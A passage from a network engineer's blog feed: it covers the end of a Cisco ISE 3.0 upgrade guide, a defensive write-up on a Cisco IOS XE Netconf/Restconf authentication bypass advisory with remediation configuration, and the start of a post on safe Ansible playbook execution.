&lt;h3 id=&quot;step-7---promote-cisco-ise-30-admin-and-monitor-nodes-optional&quot;&gt;Step 7 - Promote Cisco ISE 3.0 Admin and Monitor Nodes (Optional)&lt;/h3&gt;
&lt;p&gt;During this step we will be promoting the version 3.0 secondary admin and monitor nodes to primary, to match that of the previous version 2.4 deployment. If you do not have a requirement for specific nodes to be primary and other nodes to be secondary, you can ignore this step.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Login to your 3.0 SAN’s web GUI.&lt;/li&gt;
  &lt;li&gt;Browse to &lt;strong&gt;System &amp;gt; Deployment&lt;/strong&gt; and click the button &lt;strong&gt;Promote to Primary&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Validate the health of the new admin node by browsing to &lt;strong&gt;System &amp;gt; Deployment&lt;/strong&gt; and confirming that the &lt;strong&gt;Node Status&lt;/strong&gt; is green for all nodes.&lt;/li&gt;
  &lt;li&gt;Confirm that all nodes have connectivity to each AD join-point.&lt;/li&gt;
  &lt;li&gt;Browse to &lt;strong&gt;System &amp;gt; Deployments&lt;/strong&gt; and select the current PMN. In the &lt;strong&gt;Monitoring&lt;/strong&gt; section change the role from &lt;strong&gt;Primary&lt;/strong&gt; to &lt;strong&gt;Secondary&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;step-8---re-enable-pan-auto-failover&quot;&gt;Step 8 - Re-Enable PAN Auto-Failover&lt;/h3&gt;
&lt;p&gt;During this step we will be re-enabling the PAN auto-failover feature which was disabled in step 1.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Login to your 3.0 Primary Admin Node (PAN).&lt;/li&gt;
  &lt;li&gt;Enable PAN auto-failover by browsing to &lt;strong&gt;Administration &amp;gt; System &amp;gt; Deployment &amp;gt; PAN Failover&lt;/strong&gt; and checking the &lt;strong&gt;Enable PAN Auto Failover&lt;/strong&gt; option. Set the auto-failover settings that were documented during step 0, then click save.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;backout-plan&quot;&gt;Backout Plan&lt;/h3&gt;
&lt;p&gt;Should you need to backout to the version 2.4 Cisco ISE environment you should have all of the version 2.4 VM’s in a shutdown state on their respective hypervisors. Although this consumes space and resources on the hypervisory, it is beneficial to keep these around for several weeks until the new version 3.0 environment is confirmed operational. However, if issues are encountered and you need to backout to version 2.4 you shutdown the version 3.0 VM’s and re-enable the version 2.4 VM’s in a similar order to how you migrated from 2.4 to 3.0. You will need to re-register and join to the AD join-points for each node.&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Cisco" /><category term="Security" /><summary type="html">If you have ever read through Cisco ISE 3.0 Upgrade Guide you know that it involves a lot of decision points and having to reference many other Cisco reference documents just to build a complete implementation plan for upgrading Cisco ISE from 2.x to 3.x. It is a complicated process if you have never been through it before, and often times you’re left with more questions than answers when researching how to proceed. This usually involves engaging Cisco TAC to help clarify points that aren’t necessarily obvious in their documentation. Having gone through this upgrade path this past year, I thought that documenting the procedures that I followed may help others gain success in their own upgrades. Understand that all implementations are different, so use this as another piece of information as you research how to perform this upgrade.</summary></entry><entry><title type="html">Cisco IOS XE Netconf and Restconf Authentication Bypass Vulnerability</title><link href="http://localhost:4000/2021/09/26/cisco-sa-aaa-Yx47ZT8Q-netconf-restconf-auth-bypass.html" rel="alternate" type="text/html" title="Cisco IOS XE Netconf and Restconf Authentication Bypass Vulnerability" /><published>2021-09-26T00:00:00-06:00</published><updated>2021-09-26T00:00:00-06:00</updated><id>http://localhost:4000/2021/09/26/cisco-sa-aaa-Yx47ZT8Q-netconf-restconf-auth-bypass</id><content type="html" xml:base="http://localhost:4000/2021/09/26/cisco-sa-aaa-Yx47ZT8Q-netconf-restconf-auth-bypass.html">&lt;p&gt;Earlier this week Cisco announced in its semiannual &lt;a href=&quot;https://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74581&quot;&gt;Cisco IOS and IOS XE bundled software security advisory publication&lt;/a&gt; some very concerning security advisories (3 critical, 11 high and 11 medium severity), one of which allows an attacker to &lt;a href=&quot;https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-aaa-Yx47ZT8Q&quot;&gt;bypass authentication on devices configured for netconf or restconf&lt;/a&gt;. After an attacker has bypassed authentication, they can install, manipulate, or delete your Cisco IOS XE devices configuration or cause a memory corruption that results in a denial of service (DoS) condition.&lt;/p&gt;

&lt;p&gt;This authentication bypass vulnerability has multiple conditions that must be met for a device to be considered vulnerable:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The software version of Cisco IOS XE must match one of the ~140 impacted software versions. Review the CVRF file for a list of affected software versions or the software checker utility, both found at the &lt;a href=&quot;https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-aaa-Yx47ZT8Q&quot;&gt;advisory link&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;You must have have multiple features configured:
    &lt;ul&gt;
      &lt;li&gt;Authentication, Authorization, Accounting (AAA), and&lt;/li&gt;
      &lt;li&gt;Netconf or restconf, and&lt;/li&gt;
      &lt;li&gt;An &lt;strong&gt;enable password&lt;/strong&gt; without an &lt;strong&gt;enable secret&lt;/strong&gt; configured&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To validate if the affected features are enabled use the following commands:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Validating AAA is configured
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;show running-config | include aaa authentication login&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Validating Netconf or Restconf is configured
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;show running-config | include netconf|restconf&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Validating the enable password and secret configuration
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;show running-config | include enable password|secret&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;remediating-the-exposure&quot;&gt;Remediating the Exposure&lt;/h2&gt;

&lt;p&gt;There are multiple steps that should be taken to remediate, or limit, the exposure to this vulnerability, as well as some best practices to follow when it comes to the affected features. These include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Re-issue secrets, passphrases, and keys&lt;/li&gt;
  &lt;li&gt;Configure an enable secret and remove the enable password&lt;/li&gt;
  &lt;li&gt;Configure Netconf and Restconf Service-Level ACL’s&lt;/li&gt;
  &lt;li&gt;Compare Configuration for Signs of Manipulation&lt;/li&gt;
  &lt;li&gt;Upgrade to an Unaffected Cisco IOS XE Software Version&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;re-issue-secrets-passphrases-and-keys&quot;&gt;Re-Issue Secrets, Passphrases, and Keys&lt;/h3&gt;

&lt;p&gt;Given that the vulnerability allows a remote attacker to manipulate the current configuration on an affected device, it would be best to consider the configuration compromised. Sensitive information stored within your Cisco IOS XE devices configuration could include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Local usernames and password&lt;/li&gt;
  &lt;li&gt;Enable password&lt;/li&gt;
  &lt;li&gt;Enable secret&lt;/li&gt;
  &lt;li&gt;Keychains used for various different protocols&lt;/li&gt;
  &lt;li&gt;Protocol authentication keys (routing protocols, FHRP’s, VTP, IKE, NTP, TACACS+, RADIUS, etc)&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;It’s worth noting that the entire configuration file of your device should be considered sensitive. The protocols which you have enabled, the software version, IP addresses used, the physical connections, and administratively defined variables. All of this information can be used by an attacker to survey your infrastructure to prepare for another attack. Unfortunately, it can be quite difficult to change your network architecture simply because your configuration is potentially compromised. However, there are are best-practices that you can follow for &lt;a href=&quot;https://www.optanix.com/five-best-practices-for-securing-network-device-management-functions/&quot;&gt;securing network device management functions&lt;/a&gt; to reduce your exposure&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I’ll refere to the list of sensitive information above simply as &lt;em&gt;secrets&lt;/em&gt; going forward. Some of these secrets, depending on the feature that they are configured for, can be stored in clear-text or in an encrypted fashion. It is good to be in the habit of changing these secrets on a regular interval and using strong password requirements. By already having a process in place to programmatically change these secrets as part of regular lifecycle management, responding to a potential compromise becomes far easier. By using a tool such as &lt;a href=&quot;https://www.ansible.com/&quot;&gt;Ansible&lt;/a&gt;, you can lifecycle secrets across multiple different device vendors and models (among so many other network management tasks!)&lt;/p&gt;

&lt;h3 id=&quot;configure-an-enable-secret&quot;&gt;Configure an Enable Secret&lt;/h3&gt;

&lt;p&gt;Cisco’s &lt;a href=&quot;https://www.cisco.com/c/en/us/support/docs/ip/access-lists/13608-21.html#anc14&quot;&gt;IOS hardening guide&lt;/a&gt; has long recommended using an &lt;strong&gt;enable secret&lt;/strong&gt; instead of an &lt;strong&gt;enable password&lt;/strong&gt; for securing privileged administrative access. Although this particular authentication bypass vulnerability also relies on AAA having been configured (wherein you would most likely be using an external service for authorizing privileged access), simply having an enable password configured in addition to AAA is one of the conditions for exposure. Even with AAA enabled, it is still recommended to configure a local enable secret in the event that your external AAA serves are not reachable.&lt;/p&gt;

&lt;p&gt;So what is the difference between an enable secret and an enable password? While both provide the same overall functionality (authorizing users into a higher privilege level), how the Cisco IOS XE device stores the key is different. The key associated with the &lt;strong&gt;enable password&lt;/strong&gt; is stored using a weak cipher (if the &lt;strong&gt;service password-encryption&lt;/strong&gt; feature is enabled) or in clear text. It uses the Vigenere cipher which can be easily deciphered. The &lt;strong&gt;enable secret&lt;/strong&gt; key uses MD5 for one-way password hashing which cannot be reversed. If someone has the hash, they will be unable to put this through a mathmatical formula to reverse it to clear text. It is susceptiable to dictionary attacks, but this is only if your Cisco IOS XE’s configuration file has been compromised (see the recommendation above about re-issuing local secrets, passphrases, and keys).&lt;/p&gt;

&lt;p&gt;If you have any network devices still configured with an enable password instead of an enable secret, it is strongly recommended to configure an enable secret (with a &lt;strong&gt;different&lt;/strong&gt; key than the enable password) and remove the enable password. This is one of Cisco’s recommended steps to remediate this authentication bypass vulnerability. It can be accomplished as simply as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#config t
Enter configuration commands, one per line.  End with CNTL/Z.
Router(config)#enable secret F@ncy3nable5ecret
Router(config)#no enable password
Router(config)#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;configure-netconf-and-restconf-service-level-acls&quot;&gt;Configure Netconf and Restconf Service-Level ACL’s&lt;/h3&gt;

&lt;p&gt;There are most likely a very small number of sources that should be interfacing with the Netconf or Restconf services on your Cisco IOS XE devices. Once enabled, the default Netconf/Restconf configuration allows &lt;em&gt;any&lt;/em&gt; source to communicate with the Netconf/Restconf service, as long as it has IP reachability to your network device. To limit your exposure, you can configure &lt;a href=&quot;https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/prog/configuration/1611/b_1611_programmability_cg/service_level_ACLs_NETCONF_RESTCONF.html&quot;&gt;Netconf/Restconf service-level ACL’s&lt;/a&gt; to restrict only known trusted source IP address ranges to communicate with these services on the network device. Although this is not guaranteed to secure your device (a compromised network management system may be within the permitted source address ranges), it is one method that can be used to make it far more difficult for an attacker.&lt;/p&gt;

&lt;p&gt;To configure a service-level ACL and apply it to the Netconf and Restconf protocols, see the following as an example. In this case we are permitting two network management IP address ranges 10.1.255.0/24 and 10.2.255.0/24, followed by applying the ACL to the Netconf and Restconf processes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#config t
Router(config)#ip access-list standard NET_MGMT_RANGES_ACL
Router(config-std-nacl)#permit 10.1.255.0 0.0.0.255
Router(config-std-nacl)#permit 10.2.255.0 0.0.0.255
Router(config-std-nacl)#exit
Router(config)#netconf-yang ssh ipv4 access-list name NET_MGMT_RANGES_ACL
Router(config)#restconf ipv4 access-list name NET_MGMT_RANGES_ACL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;compare-configuration-for-signs-of-manipulation&quot;&gt;Compare Configuration for Signs of Manipulation&lt;/h3&gt;

&lt;p&gt;As stated previously, this particular vulnerability allows an attacker to manipulate the configuration of your network device. As a result, you should be looking for any signs of manipulation within that configuration. A few steps that you can take to identify unauthorized configuration changes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Compare your running &lt;em&gt;and&lt;/em&gt; startup configurations to a known ‘gold standard’ and review any deviations&lt;/li&gt;
  &lt;li&gt;Review any TACACS or RADIUS logs. This may require going as far back in time as you have been running the vulnerable Cisco IOS XE version or affected features&lt;/li&gt;
  &lt;li&gt;Review any syslog data for when configuration changes have been made. If you are logging at level 5 (notice) or higher, you can search your log data for &lt;strong&gt;SYS-5-CONFIG_I&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;upgrade-to-an-unaffected-cisco-ios-xe-software-version&quot;&gt;Upgrade to an Unaffected Cisco IOS XE Software Version&lt;/h3&gt;

&lt;p&gt;Finally, if you are unable to modify the configuration of your network device so that it is not running affected features, you can upgrade the software version to one which is not affected by this vulnerability. This would require intrusive changes as the network device is upgraded, and would require more planning and research to identify which version of software to move to.&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Automation" /><category term="Cisco" /><category term="Security" /><category term="Vulnerability" /><summary type="html">Earlier this week Cisco announced in its semiannual Cisco IOS and IOS XE bundled software security advisory publication some very concerning security advisories (3 critical, 11 high and 11 medium severity), one of which allows an attacker to bypass authentication on devices configured for netconf or restconf. After an attacker has bypassed authentication, they can install, manipulate, or delete your Cisco IOS XE devices configuration or cause a memory corruption that results in a denial of service (DoS) condition.</summary></entry><entry><title type="html">Best Practices for Safe Ansible Playbook Execution</title><link href="http://localhost:4000/2021/09/09/ansible-playbook-execution-best-practices.html" rel="alternate" type="text/html" title="Best Practices for Safe Ansible Playbook Execution" /><published>2021-09-09T00:00:00-06:00</published><updated>2021-09-09T00:00:00-06:00</updated><id>http://localhost:4000/2021/09/09/ansible-playbook-execution-best-practices</id><content type="html" xml:base="http://localhost:4000/2021/09/09/ansible-playbook-execution-best-practices.html">&lt;p&gt;Ansible can be a very powerful automation tool, allowing you to interact with hundreds or thousands of network devices at once. The automation is defined through a combination of inventory files, variable files, and playbooks (with optional task files and roles). The combination of these features makes a very powerful automation tool, but with that comes a high-level of risk. In this guide I highlight a few best practices to follow when executing Ansible playbooks. By following these best practices you will have increased confidence that you are implementing the correct tasks against the correct set of devices, and avoid any surprises!&lt;/p&gt;

&lt;p&gt;The ansible-playbook best practices covered in this post are:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Manually specifying your inventory file&lt;/li&gt;
  &lt;li&gt;Using the list-hosts flag to confirm the hosts are as you expect&lt;/li&gt;
  &lt;li&gt;Using the list-tasks flag to confirm the tasks that will be implemented&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;example-ansible-inventory-and-playbook&quot;&gt;Example Ansible Inventory and Playbook&lt;/h2&gt;

&lt;p&gt;In this post I will be using the following Ansible file structure:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
├── ansible.cfg
├── group_vars
│   └── ios.yml
├── inventory
│   ├── hosts.yml
│   └── ios_routers.yml
└── test-pb.yml

2 directories, 5 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The inventory file that we will be using is ios_routers.yml:&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;ios&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;RouterA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ansible_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.10.150&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;syslog_servers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.1.1&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.1.2&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;RouterB&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ansible_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.10.151&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;children&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;calgary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;RouterA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ottawa&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;RouterB&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, the example playbook that I have is as shown below. The specific details about what each task does is not important, what is important is that we have multiple tasks, some of which are related. This will become more apparent in my explanation of the list-tasks flag later on.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ios&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;gather_facts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;False&lt;/span&gt;

  &lt;span class=&quot;na&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Configure banner&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;banner&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;cisco.ios.ios_banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;login&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;banners.login&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Remove MOTD banner&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;banner&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;cisco.ios.ios_banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;motd&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;banners.motd&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Remove EXEC banner&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;banner&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;cisco.ios.ios_banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;exec&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;absent&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Remove incoming banner&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;banner&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;cisco.ios.ios_banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;banner&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;incoming&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;absent&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Confure logging hosts&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;logging&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ios_logging&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;host&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;syslog_servers&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Adjust local logging buffer&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;logging&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ios_logging&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;buffered&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5000&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;informational&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Configure SNMP&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;snmp&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ios_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;snmp-server location {{ snmp.location }}&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;snmp-server contact {{ snmp.contact }}&lt;/span&gt;
